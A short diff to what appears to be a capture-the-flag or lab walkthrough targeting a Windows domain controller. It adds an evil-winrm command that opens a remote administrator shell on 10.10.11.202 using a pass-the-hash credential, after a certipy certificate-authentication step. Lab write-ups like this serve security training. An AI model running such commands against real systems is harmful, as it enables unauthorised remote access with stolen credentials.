@@ -126,3 +126,6 @@ certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
 ![image](https://github.com/user-attachments/assets/1327812c-7770-4ad0-bddf-bf280b2d149d)
 
 ```
+evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
+```
+![image](https://github.com/user-attachments/assets/2f8c2ee8-2536-4e1f-87dc-2628f7ee26e2)
